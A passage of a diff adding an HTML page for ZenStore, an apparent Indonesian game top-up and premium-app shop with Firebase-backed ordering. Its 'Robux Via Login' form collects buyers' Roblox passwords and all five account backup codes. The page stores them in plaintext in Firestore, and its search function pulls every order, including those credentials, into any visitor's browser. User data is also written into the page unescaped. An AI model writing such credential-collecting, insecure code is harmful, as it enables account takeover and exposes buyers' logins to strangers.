@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZenStore - Top Up Game & Digital</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Oswald:wght@600;700&display=swap" rel="stylesheet">
+    
+    <!-- SDK Firebase Online -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, setDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAfJWdd7oM17foLNMRoK2k",
+            authDomain: "zenstore-3f8ef.firebaseapp.com",
+            projectId: "zenstore-3f8ef",
+            storageBucket: "zenstore-3f8ef.appspot.com",
+            messagingSenderId: "487720475687",
+            appId: "1:487720475687:web:dae597df0",
+            measurementId: "G-RYTR9057M9"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.selectedItemName = "";
+        window.selectedItemPrice = "";
+        window.selectedType = "standard"; // 'standard', 'gamepass', 'login'
+        window.searchMode = "user";
+
+        window.selectProduct = function(name, price, type, element) {
+            window.selectedItemName = name;
+            window.selectedItemPrice = price;
+            window.selectedType = type;
+
+            document.querySelectorAll('.option-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+
+            document.getElementById('preview-box').innerHTML = `<strong>${name}</strong> — <span style="color:#00f2fe">Rp ${price}</span>`;
+
+            const stdBox = document.getElementById('standard-form-box');
+            const gpBox = document.getElementById('roblox-gamepass-box');
+            const rbxBox = document.getElementById('roblox-login-box');
+
+            stdBox.style.display = 'none';
+            gpBox.style.display = 'none';
+            rbxBox.style.display = 'none';
+
+            if(type === 'gamepass') {
+                gpBox.style.display = 'block';
+            } else if(type === 'login') {
+                rbxBox.style.display = 'block';
+            } else {
+                stdBox.style.display = 'block';
+            }
+        };
+
+        // FUNGSI BUAT PESANAN
+        window.sendOrderToAdminWeb = async function() {
+            const paymentType = document.getElementById('payment-select').value;
+
+            if(!window.selectedItemName) {
+                alert("Harap pilih salah satu produk terlebih dahulu!");
+                return;
+            }
+
+            let finalUserData = "";
+
+            if(window.selectedType === 'login') {
+                const username = document.getElementById('rbx-username').value.trim();
+                const password = document.getElementById('rbx-password').value.trim();
+                const phone = document.getElementById('rbx-phone').value.trim();
+                const email = document.getElementById('rbx-email').value.trim();
+
+                const code1 = document.getElementById('rbx-code-1').value.trim();
+                const code2 = document.getElementById('rbx-code-2').value.trim();
+                const code3 = document.getElementById('rbx-code-3').value.trim();
+                const code4 = document.getElementById('rbx-code-4').value.trim();
+                const code5 = document.getElementById('rbx-code-5').value.trim();
+
+                if(!username || !password) {
+                    alert("Harap isi Username dan Password Roblox!");
+                    return;
+                }
+
+                if(!code1 || !code2 || !code3 || !code4 || !code5) {
+                    alert("Harap lengkapi ke-5 Kode Backup Roblox!");
+                    return;
+                }
+
+                finalUserData = `[LOGIN RBX] User: ${username} | Pass: ${password} | WA: ${phone} | Email: ${email} | Backup: ${code1}, ${code2}, ${code3}, ${code4}, ${code5}`;
+            } else if(window.selectedType === 'gamepass') {
+                const username = document.getElementById('gp-username').value.trim();
+                const phone = document.getElementById('gp-phone').value.trim();
+
+                if(!username || !phone) {
+                    alert("Harap isi Username Roblox dan No. WhatsApp!");
+                    return;
+                }
+
+                finalUserData = `[GAMEPASS] User: ${username} | WA: ${phone}`;
+            } else {
+                const standardUser = document.getElementById('user-data-standard').value.trim();
+                if(!standardUser) {
+                    alert("Harap masukkan Username / User ID Game / No HP!");
+                    return;
+                }
+                finalUserData = standardUser;
+            }
+
+            const randId = "ZN-" + Math.floor(100000 + Math.random() * 900000);
+            const now = new Date().toLocaleString("id-ID");
+
+            try {
+                await setDoc(doc(db, "orders", randId), {
+                    invoiceId: randId,
+                    product: `${window.selectedItemName} (Rp ${window.selectedItemPrice})`,
+                    userData: finalUserData,
+                    paymentMethod: paymentType,
+                    status: "Menunggu Pembayaran",
+                    createdAt: now
+                });
+
+                document.getElementById('inv-id').innerText = "#" + randId;
+                document.getElementById('inv-item').innerText = `${window.selectedItemName} (Rp ${window.selectedItemPrice})`;
+                document.getElementById('inv-user').innerText = finalUserData;
+                document.getElementById('inv-pay').innerText = paymentType;
+
+                document.getElementById('invoice-modal').style.display = "flex";
+            } catch (e) {
+                alert("Gagal terhubung ke database. Error: " + e.message);
+            }
+        };
+
+        // FUNGSI CEK STATUS PESANAN
+        window.searchOrder = async function() {
+            const searchInput = document.getElementById("search-input-val").value.trim();
+            const resultBox = document.getElementById("search-result-content");
+
+            if (!searchInput) {
+                alert("Harap masukkan kata kunci pencarian!");
+                return;
+            }
+
+            resultBox.innerHTML = "<p style='color:#00f2fe;'>🔍 Sedang mencari data pesanan...</p>";
+
+            try {
+                const ordersRef = collection(db, "orders");
+                let foundDocs = [];
+
+                if (window.searchMode === 'invoice') {
+                    let formattedQuery = searchInput.toUpperCase();
+                    if (!formattedQuery.startsWith("ZN-")) {
+                        formattedQuery = "ZN-" + formattedQuery;
+                    }
+
+                    const q = query(ordersRef, where("invoiceId", "==", formattedQuery));
+                    const querySnapshot = await getDocs(q);
+                    querySnapshot.forEach((docSnap) => foundDocs.push(docSnap.data()));
+                } else {
+                    const qAll = await getDocs(ordersRef);
+                    qAll.forEach((docSnap) => {
+                        const data = docSnap.data();
+                        if (data.userData && data.userData.toLowerCase().includes(searchInput.toLowerCase())) {
+                            foundDocs.push(data);
+                        }
+                    });
+                }
+
+                if (foundDocs.length === 0) {
+                    resultBox.innerHTML = `
+                        <div style="background:rgba(255,0,85,0.1); border:1px solid #ff0055; padding:12px; border-radius:8px; color:#ff0055;">
+                            ❌ Pesanan tidak ditemukan. Periksa kembali No. Invoice / User ID kamu!
+                        </div>
+                    `;
+                } else {
+                    let htmlResult = "";
+                    foundDocs.forEach(item => {
+                        const statusColor = item.status === "Selesai" ? "#25d366" : "#ffcc00";
+                        htmlResult += `
+                            <div style="background:#0f1117; border:1px solid #00f2fe; padding:12px; border-radius:10px; text-align:left; margin-bottom:10px;">
+                                <p style="font-size:12px; color:#aaa;">Invoice: <b style="color:#fff;">#${item.invoiceId}</b></p>
+                                <p style="font-size:12px; color:#aaa;">Produk: <b style="color:#00f2fe;">${item.product}</b></p>
+                                <p style="font-size:12px; color:#aaa;">Waktu: <span style="color:#fff;">${item.createdAt || '-'}</span></p>
+                                <p style="font-size:12px; color:#aaa; margin-top:5px;">Status: <b style="color:${statusColor};">${item.status}</b></p>
+                            </div>
+                        `;
+                    });
+                    resultBox.innerHTML = htmlResult;
+                }
+            } catch (e) {
+                resultBox.innerHTML = `<p style='color:#ff0055;'>Gagal mencari pesanan: ${e.message}</p>`;
+            }
+        };
+
+        window.openCekPesanan = function() {
+            document.getElementById('cek-pesanan-modal').style.display = 'flex';
+        };
+
+        window.closeCekPesanan = function() {
+            document.getElementById('cek-pesanan-modal').style.display = 'none';
+            document.getElementById('search-result-content').innerHTML = '';
+        };
+
+        window.setSearchMode = function(mode) {
+            window.searchMode = mode;
+            const btnUser = document.getElementById('tab-search-user');
+            const btnInv = document.getElementById('tab-search-invoice');
+            const inputField = document.getElementById('search-input-val');
+
+            if(mode === 'user') {
+                btnUser.classList.add('active');
+                btnInv.classList.remove('active');
+                inputField.placeholder = "Masukkan Username / User ID kamu...";
+            } else {
+                btnInv.classList.add('active');
+                btnUser.classList.remove('active');
+                inputField.placeholder = "Masukkan Invoice ID (Contoh: ZN-123456)...";
+            }
+        };
+
+        window.switchTab = function(tabName, eventObj) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+
+            document.getElementById('tab-' + tabName).classList.add('active');
+            if(eventObj && eventObj.currentTarget) {
+                eventObj.currentTarget.classList.add('active');
+            }
+        };
+    </script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background-color: #0f1117; color: #ffffff; min-height: 100vh; padding-bottom: 50px; }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 5%;
+            background: #161922;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-left { display: flex; flex-direction: column; align-items: flex-start; gap: 6px; }
+        .logo { font-size: 18px; font-weight: 700; color: #fff; line-height: 1; }
+        .logo span { color: #00f2fe; }
+
+        .btn-cek-header { background: #00f2fe; color: #000; text-decoration: none; padding: 5px 10px; border-radius: 6px; font-size: 10px; font-weight: 700; cursor: pointer; border: none; }
+        .header-right { display: flex; align-items: center; gap: 8px; }
+        .btn-wa-header { background: #25d366; color: #fff; text-decoration: none; padding: 6px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; }
+        .btn-admin-header { background: rgba(255,255,255,0.1); color: #fff; text-decoration: none; padding: 6px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; border: 1px solid rgba(255,255,255,0.2); }
+
+        .hero {
+            margin: 20px 5%;
+            background: linear-gradient(135deg, #1f2430 0%, #11141c 100%);
+            border: 1px solid rgba(0, 242, 254, 0.2);
+            padding: 25px 15px;
+            border-radius: 16px;
+            text-align: center;
+        }
+
+        .hero h1 { font-family: 'Oswald', sans-serif; font-size: 28px; color: #00f2fe; margin-bottom: 4px; letter-spacing: 1px; text-transform: uppercase; }
+        .hero p { font-size: 11px; color: #a0a5b5; margin-bottom: 12px; }
+
+        .hero-logos { display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .hero-logo-item { width: 32px; height: 32px; background: rgba(255, 255, 255, 0.05); border-radius: 8px; display: flex; align-items: center; justify-content: center; padding: 6px; }
+        .hero-logo-item svg { width: 100%; height: 100%; }
+
+        .container { padding: 0 5%; margin-top: 20px; }
+
+        .category-nav { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 10px; margin-bottom: 20px; scrollbar-width: none; }
+        .category-nav::-webkit-scrollbar { display: none; }
+
+        .nav-btn { background: #161922; color: #a0a5b5; border: 1px solid rgba(255, 255, 255, 0.08); padding: 8px 16px; border-radius: 20px; font-size: 12px; font-weight: 600; white-space: nowrap; cursor: pointer; transition: 0.3s; }
+        .nav-btn.active, .nav-btn:hover { background: #00f2fe; color: #000; border-color: #00f2fe; }
+
+        .section-title { font-size: 14px; font-weight: 700; margin-bottom: 12px; margin-top: 15px; border-left: 4px solid #00f2fe; padding-left: 10px; color: #fff; }
+
+        .grid-options { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+        .option-card { background: #161922; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 12px; padding: 12px 8px; text-align: center; cursor: pointer; transition: 0.2s; position: relative; }
+        .option-card:hover { border-color: #00f2fe; }
+        .option-card.selected { background: rgba(0, 242, 254, 0.08); border: 2px solid #00f2fe; box-shadow: 0 0 10px rgba(0, 242, 254, 0.2); }
+
+        .badge { position: absolute; top: -6px; right: -6px; background: #ff0055; color: #fff; font-size: 8px; font-weight: 700; padding: 2px 6px; border-radius: 10px; }
+        .option-name { font-size: 11px; font-weight: 600; color: #fff; margin-bottom: 4px; }
+        .option-price { font-size: 11px; font-weight: 700; color: #00f2fe; }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .order-box { background: #161922; padding: 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); margin-top: 30px; }
+        .order-box label { font-size: 12px; color: #aaa; display: block; margin-top: 15px; }
+        .order-box input, .order-box select { width: 100%; padding: 12px; margin-top: 6px; background: #0f1117; border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 8px; outline: none; font-size: 13px; }
+
+        .roblox-gamepass-form, .roblox-login-form {
+            display: none;
+            background: #0f1117;
+            padding: 18px;
+            border-radius: 12px;
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            margin-top: 15px;
+        }
+        .roblox-gamepass-form h4, .roblox-login-form h4 { color: #00f2fe; font-size: 14px; margin-bottom: 12px; text-align: center; }
+        .backup-title { font-size: 12px; font-weight: 700; color: #ff0055; margin-top: 15px; margin-bottom: 8px; text-align: center; }
+
+        .tutorial-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 15px;
+            font-size: 11px;
+            color: #aaa;
+            line-height: 1.6;
+        }
+        .tutorial-box ol { padding-left: 15px; }
+
+        .selected-preview { background: #0f1117; padding: 12px; border-radius: 8px; border: 1px dashed #00f2fe; margin-top: 8px; font-size: 12px; color: #fff; }
+        .btn-pay-web { display: block; width: 100%; padding: 14px; margin-top: 18px; background: #00f2fe; color: #000; font-weight: 700; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; text-align: center; }
+
+        .modal-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.88); z-index: 200; justify-content: center; align-items: center; padding: 20px; }
+        .modal-card-box { background: #161922; padding: 25px 20px; border-radius: 16px; border: 1px solid #00f2fe; width: 100%; max-width: 420px; text-align: center; max-height: 90vh; overflow-y: auto; }
+        .modal-card-box h3 { color: #00f2fe; font-size: 18px; margin-bottom: 4px; }
+
+        .search-tab-switch { display: flex; background: #0f1117; border-radius: 10px; padding: 4px; margin: 15px 0; gap: 4px; }
+        .search-tab-btn { flex: 1; padding: 8px; font-size: 11px; font-weight: 600; border: none; border-radius: 8px; background: transparent; color: #aaa; cursor: pointer; }
+        .search-tab-btn.active { background: #00f2fe; color: #000; font-weight: 700; }
+        .search-input-field { width: 100%; padding: 12px; background: #0f1117; border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 8px; outline: none; font-size: 12px; margin-bottom: 12px; text-align: center; }
+
+        .invoice-detail { background: #0f1117; padding: 12px; border-radius: 8px; text-align: left; margin: 12px 0; font-size: 12px; line-height: 1.8; }
+        .invoice-detail span { color: #00f2fe; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-left">
+            <div class="logo">Zen<span>Store</span></div>
+            <button onclick="openCekPesanan()" class="btn-cek-header">🔍 Cek Pesanan</button>
+        </div>
+        <div class="header-right">
+            <a href="https://wa.me/6285872562036" class="btn-wa-header" target="_blank">Admin WA</a>
+            <a href="admin.html" class="btn-admin-header">Web Admin</a>
+        </div>
+    </header>
+
+    <div class="hero">
+        <h1>ZENSTORE DIGITAL TOP UP</h1>
+        <p>Pilih Produk & Bayar Otomatis • Fast 24 Jam</p>
+        
+        <div class="hero-logos">
+            <div class="hero-logo-item">
+                <svg viewBox="0 0 24 24" fill="#00f2fe"><path d="M5.164 0L0 18.836 18.836 24 24 5.164 5.164 0zm9.337 13.784l-4.522-1.212 1.212-4.522 4.522 1.212-1.212 4.522z"/></svg>
+            </div>
+            <div class="hero-logo-item">
+                <svg viewBox="0 0 24 24" fill="#1DB954"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.48.66.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141 C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.18-.1.2-.84-.36-.18-.6.36-1.2.96-1.38 4.26-1.26 11.28-1.02 15.72 1.62.54.3.72 1.02.42 1.56-.3.42-1.02.6-1.56.3z"/></svg>
+            </div>
+            <div class="hero-logo-item">
+                <svg viewBox="0 0 24 24" fill="#E50914"><path d="M5.398 0v24h4.156l.006-11.838 5.044 11.838h4.017V0h-4.148l-.008 11.84L9.419 0H5.398z"/></svg>
+            </div>
+            <div class="hero-logo-item">
+                <svg viewBox="0 0 24 24" fill="#FF0000"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        
+        <div class="category-nav">
+            <button class="nav-btn active" onclick="switchTab('mlbb', event)">Mobile Legends</button>
+            <button class="nav-btn" onclick="switchTab('roblox', event)">Roblox</button>
+            <button class="nav-btn" onclick="switchTab('other-games', event)">Game Lainnya</button>
+            <button class="nav-btn" onclick="switchTab('apps', event)">Aplikasi Premium</button>
+        </div>
+
+        <!-- TAB 1: MOBILE LEGENDS -->
+        <div id="tab-mlbb" class="tab-content active">
+            <div class="section-title">Special Promo MLBB 🌟</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('Weekly Pass (1x) MLBB', '27.500', 'standard', this)">
+                    <span class="badge">BEST</span>
+                    <div class="option-name">Weekly Pass (1x)</div>
+                    <div class="option-price">Rp 27.500</div>
+                </div>
+                <div class="option-card" onclick="selectProduct('Weekly Pass (2x) MLBB', '55.000', 'standard', this)">
+                    <div class="option-name">Weekly Pass (2x)</div>
+                    <div class="option-price">Rp 55.000</div>
+                </div>
+                <div class="option-card" onclick="selectProduct('Weekly Pass (3x) MLBB', '82.500', 'standard', this)">
+                    <div class="option-name">Weekly Pass (3x)</div>
+                    <div class="option-price">Rp 82.500</div>
+                </div>
+                <div class="option-card" onclick="selectProduct('Twilight Pass MLBB', '145.000', 'standard', this)">
+                    <div class="option-name">Twilight Pass</div>
+                    <div class="option-price">Rp 145.000</div>
+                </div>
+            </div>
+
+            <div class="section-title">Nominal Diamond MLBB 💎 (Kecil - Besar)</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('5 Diamonds MLBB', '1.500', 'standard', this)"><div class="option-name">5 Diamonds</div><div class="option-price">Rp 1.500</div></div>
+                <div class="option-card" onclick="selectProduct('12 Diamonds MLBB', '3.800', 'standard', this)"><div class="option-name">12 Diamonds</div><div class="option-price">Rp 3.800</div></div>
+                <div class="option-card" onclick="selectProduct('85 Diamonds MLBB', '24.000', 'standard', this)"><div class="option-name">85 Diamonds</div><div class="option-price">Rp 24.000</div></div>
+                <div class="option-card" onclick="selectProduct('170 Diamonds MLBB', '48.000', 'standard', this)"><div class="option-name">170 Diamonds</div><div class="option-price">Rp 48.000</div></div>
+                <div class="option-card" onclick="selectProduct('240 Diamonds MLBB', '67.000', 'standard', this)"><div class="option-name">240 Diamonds</div><div class="option-price">Rp 67.000</div></div>
+                <div class="option-card" onclick="selectProduct('296 Diamonds MLBB', '84.000', 'standard', this)"><div class="option-name">296 Diamonds</div><div class="option-price">Rp 84.000</div></div>
+                <div class="option-card" onclick="selectProduct('408 Diamonds MLBB', '115.000', 'standard', this)"><div class="option-name">408 Diamonds</div><div class="option-price">Rp 115.000</div></div>
+                <div class="option-card" onclick="selectProduct('568 Diamonds MLBB', '160.000', 'standard', this)"><div class="option-name">568 Diamonds</div><div class="option-price">Rp 160.000</div></div>
+                <div class="option-card" onclick="selectProduct('875 Diamonds MLBB', '245.000', 'standard', this)"><div class="option-name">875 Diamonds</div><div class="option-price">Rp 245.000</div></div>
+                <div class="option-card" onclick="selectProduct('2010 Diamonds MLBB', '550.000', 'standard', this)"><div class="option-name">2010 Diamonds</div><div class="option-price">Rp 550.000</div></div>
+            </div>
+        </div>
+
+        <!-- TAB 2: ROBLOX -->
+        <div id="tab-roblox" class="tab-content">
+            <div class="section-title">Robux Via Gamepass 🎮 (Kecil - Besar)</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('80 Robux Via Gamepass', '12.000', 'gamepass', this)"><div class="option-name">80 Robux Gamepass</div><div class="option-price">Rp 12.000</div></div>
+                <div class="option-card" onclick="selectProduct('100 Robux Via Gamepass', '15.000', 'gamepass', this)"><div class="option-name">100 Robux Gamepass</div><div class="option-price">Rp 15.000</div></div>
+                <div class="option-card" onclick="selectProduct('200 Robux Via Gamepass', '29.000', 'gamepass', this)"><div class="option-name">200 Robux Gamepass</div><div class="option-price">Rp 29.000</div></div>
+                <div class="option-card" onclick="selectProduct('400 Robux Via Gamepass', '58.000', 'gamepass', this)"><div class="option-name">400 Robux Gamepass</div><div class="option-price">Rp 58.000</div></div>
+                <div class="option-card" onclick="selectProduct('800 Robux Via Gamepass', '115.000', 'gamepass', this)"><div class="option-name">800 Robux Gamepass</div><div class="option-price">Rp 115.000</div></div>
+                <div class="option-card" onclick="selectProduct('1000 Robux Via Gamepass', '140.000', 'gamepass', this)"><div class="option-name">1000 Robux Gamepass</div><div class="option-price">Rp 140.000</div></div>
+            </div>
+
+            <div class="section-title">Robux Via Group (Payout Instant) 👥</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('100 Robux Via Group', '16.000', 'standard', this)"><div class="option-name">100 Robux Group</div><div class="option-price">Rp 16.000</div></div>
+                <div class="option-card" onclick="selectProduct('250 Robux Via Group', '40.000', 'standard', this)"><div class="option-name">250 Robux Group</div><div class="option-price">Rp 40.000</div></div>
+                <div class="option-card" onclick="selectProduct('500 Robux Via Group', '79.000', 'standard', this)"><div class="option-name">500 Robux Group</div><div class="option-price">Rp 79.000</div></div>
+                <div class="option-card" onclick="selectProduct('1000 Robux Via Group', '155.000', 'standard', this)"><div class="option-name">1000 Robux Group</div><div class="option-price">Rp 155.000</div></div>
+            </div>
+
+            <div class="section-title">Robux Via Login 🔑</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('100 Robux Via Login', '15.000', 'login', this)"><div class="option-name">100 Robux Login</div><div class="option-price">Rp 15.000</div></div>
+                <div class="option-card" onclick="selectProduct('250 Robux Via Login', '37.000', 'login', this)"><div class="option-name">250 Robux Login</div><div class="option-price">Rp 37.000</div></div>
+                <div class="option-card" onclick="selectProduct('500 Robux Via Login', '73.000', 'login', this)"><div class="option-name">500 Robux Login</div><div class="option-price">Rp 73.000</div></div>
+                <div class="option-card" onclick="selectProduct('800 Robux Via Login', '110.000', 'login', this)"><div class="option-name">800 Robux Login</div><div class="option-price">Rp 110.000</div></div>
+                <div class="option-card" onclick="selectProduct('1000 Robux Via Login', '135.000', 'login', this)"><div class="option-name">1000 Robux Login</div><div class="option-price">Rp 135.000</div></div>
+                <div class="option-card" onclick="selectProduct('2000 Robux Via Login', '265.000', 'login', this)"><div class="option-name">2000 Robux Login</div><div class="option-price">Rp 265.000</div></div>
+            </div>
+        </div>
+
+        <!-- TAB 3: GAME LAINNYA -->
+        <div id="tab-other-games" class="tab-content">
+            <div class="section-title">Free Fire 💥</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('50 Diamonds Free Fire', '8.000', 'standard', this)"><div class="option-name">50 DM FF</div><div class="option-price">Rp 8.000</div></div>
+                <div class="option-card" onclick="selectProduct('70 Diamonds Free Fire', '10.000', 'standard', this)"><div class="option-name">70 DM FF</div><div class="option-price">Rp 10.000</div></div>
+                <div class="option-card" onclick="selectProduct('140 Diamonds Free Fire', '19.000', 'standard', this)"><div class="option-name">140 DM FF</div><div class="option-price">Rp 19.000</div></div>
+                <div class="option-card" onclick="selectProduct('355 Diamonds Free Fire', '47.000', 'standard', this)"><div class="option-name">355 DM FF</div><div class="option-price">Rp 47.000</div></div>
+                <div class="option-card" onclick="selectProduct('720 Diamonds Free Fire', '93.000', 'standard', this)"><div class="option-name">720 DM FF</div><div class="option-price">Rp 93.000</div></div>
+                <div class="option-card" onclick="selectProduct('Membership Mingguan FF', '30.000', 'standard', this)"><div class="option-name">Member Mingguan</div><div class="option-price">Rp 30.000</div></div>
+                <div class="option-card" onclick="selectProduct('Membership Bulanan FF', '120.000', 'standard', this)"><div class="option-name">Member Bulanan</div><div class="option-price">Rp 120.000</div></div>
+            </div>
+
+            <div class="section-title">PUBG Mobile 🔫</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('60 UC PUBG', '14.500', 'standard', this)"><div class="option-name">60 UC PUBG</div><div class="option-price">Rp 14.500</div></div>
+                <div class="option-card" onclick="selectProduct('120 UC PUBG', '29.000', 'standard', this)"><div class="option-name">120 UC PUBG</div><div class="option-price">Rp 29.000</div></div>
+                <div class="option-card" onclick="selectProduct('325 UC PUBG', '73.000', 'standard', this)"><div class="option-name">325 UC PUBG</div><div class="option-price">Rp 73.000</div></div>
+                <div class="option-card" onclick="selectProduct('660 UC PUBG', '145.000', 'standard', this)"><div class="option-name">660 UC PUBG</div><div class="option-price">Rp 145.000</div></div>
+            </div>
+
+            <div class="section-title">Genshin Impact ❄️</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('60 Genesis Crystal', '16.000', 'standard', this)"><div class="option-name">60 Crystal</div><div class="option-price">Rp 16.000</div></div>
+                <div class="option-card" onclick="selectProduct('300 Genesis Crystal', '78.000', 'standard', this)"><div class="option-name">300 Crystal</div><div class="option-price">Rp 78.000</div></div>
+                <div class="option-card" onclick="selectProduct('Blessing Welkin Moon', '79.000', 'standard', this)"><div class="option-name">Blessing Welkin</div><div class="option-price">Rp 79.000</div></div>
+            </div>
+        </div>
+
+        <!-- TAB 4: APLIKASI PREMIUM -->
+        <div id="tab-apps" class="tab-content">
+            <div class="section-title">Spotify Premium 🎧</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('Spotify 1 Bulan', '18.000', 'standard', this)"><div class="option-name">Spotify 1 Bulan</div><div class="option-price">Rp 18.000</div></div>
+                <div class="option-card" onclick="selectProduct('Spotify 2 Bulan', '32.000', 'standard', this)"><div class="option-name">Spotify 2 Bulan</div><div class="option-price">Rp 32.000</div></div>
+                <div class="option-card" onclick="selectProduct('Spotify 3 Bulan', '45.000', 'standard', this)"><div class="option-name">Spotify 3 Bulan</div><div class="option-price">Rp 45.000</div></div>
+            </div>
+
+            <div class="section-title">Netflix Premium 🎬</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('Netflix 1 Bulan (Shared)', '25.000', 'standard', this)"><div class="option-name">1 Bulan (Shared)</div><div class="option-price">Rp 25.000</div></div>
+                <div class="option-card" onclick="selectProduct('Netflix 1 Bulan (Private)', '115.000', 'standard', this)"><div class="option-name">1 Bulan (Private)</div><div class="option-price">Rp 115.000</div></div>
+            </div>
+
+            <div class="section-title">YouTube Premium 🔴</div>
+            <div class="grid-options">
+                <div class="option-card" onclick="selectProduct('YouTube 1 Bulan', '10.000', 'standard', this)"><div class="option-name">YouTube 1 Bulan</div><div class="option-price">Rp 10.000</div></div>
+                <div class="option-card" onclick="selectProduct('YouTube 3 Bulan', '25.000', 'standard', this)"><div class="option-name">YouTube 3 Bulan</div><div class="option-price">Rp 25.000</div></div>
+            </div>
+        </div>
+
+        <!-- FORM PEMESANAN DYNAMIC -->
+        <div class="order-box">
+            <div class="section-title" style="margin-bottom:10px; border:none; padding:0;">🛒 Form Pemesanan</div>
+            
+            <label>Product Yang Dipilih:</label>
+            <div id="preview-box" class="selected-preview">Belum ada item yang dipilih. Klik salah satu produk di atas!</div>
+
+            <!-- FORM STANDAR -->
+            <div id="standard-form-box">
+                <label>Masukkan Data Akun / User ID / No HP:</label>
+                <input type="text" id="user-data-standard" placeholder="Contoh: Username / User ID / No HP">
+            </div>
+
+            <!-- FORM KHUSUS ROBLOX GAMEPASS -->
+            <div id="roblox-gamepass-box" class="roblox-gamepass-form">
+                <h4>🎮 Detail Informasi Gamepass</h4>
+                
+                <label style="margin-top:5px;">Username Roblox:</label>
+                <input type="text" id="gp-username" placeholder="Masukkan Username Roblox">
+
+                <label>No. WhatsApp Aktif:</label>
+                <input type="number" id="gp-phone" placeholder="Contoh: 085872562036">
+
+                <div class="tutorial-box" style="margin-top:15px; border-left:3px solid #00f2fe;">
+                    <strong>Catatan Proses Gamepass:</strong>
+                    <ol style="margin-top:5px; line-height:1.6;">
+                        <li>Akan muncul <b>pending</b> pertama di akunmu dalam <b>2-3 hari</b> setelah pembayaran.</li>
+                        <li>Setelah itu, Robux akan masuk sepenuhnya <b>±5 hari</b> berikutnya.</li>
+                    </ol>
+                    <p style="margin-top:8px; font-size:10px; color:#aaa;">Jadi, total estimasi waktu dari pembayaran hingga Robux benar-benar masuk ke akunmu adalah sekitar <b>7-9 hari</b>.</p>
+                </div>
+            </div>
+
+            <!-- FORM KHUSUS ROBLOX LOGIN -->
+            <div id="roblox-login-box" class="roblox-login-form">
+                <h4>🔑 Informasi Akun Roblox Login</h4>
+                
+                <label style="margin-top:5px;">Username Roblox:</label>
+                <input type="text" id="rbx-username" placeholder="Masukkan Username Roblox">
+
+                <label>Password Roblox:</label>
+                <input type="password" id="rbx-password" placeholder="Masukkan Password Roblox">
+
+                <label>No. WhatsApp Aktif:</label>
+                <input type="number" id="rbx-phone" placeholder="Contoh: 085872562036">
+
+                <label>Email Notifikasi:</label>
+                <input type="email" id="rbx-email" placeholder="Contoh: emailkamu@gmail.com">
+
+                <div class="backup-title">🛡️ Masukkan Kode Backup (5 Buah)</div>
+                <input type="text" id="rbx-code-1" placeholder="Kode Backup 1">
+                <input type="text" id="rbx-code-2" placeholder="Kode Backup 2">
+                <input type="text" id="rbx-code-3" placeholder="Kode Backup 3">
